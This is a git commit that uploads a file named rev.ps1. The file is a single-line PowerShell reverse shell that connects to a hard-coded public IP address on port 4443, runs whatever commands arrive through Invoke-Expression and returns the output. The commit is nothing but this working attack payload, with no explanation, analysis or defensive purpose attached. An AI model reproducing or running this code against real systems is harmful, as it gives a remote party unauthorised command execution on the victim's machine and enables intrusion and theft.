a71e81e3dbeac302cc105a0d79abd7958c6dea37
myansen039 <110541304+myansen039@users.noreply.github.com>
2022-09-19 13:01:09 +0530

    Add files via upload

---
+++ rev.ps1
@@ -0,0 +1,1 @@
+﻿$sm=(New-Object Net.Sockets.TCPClient('172.105.53.52',4443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
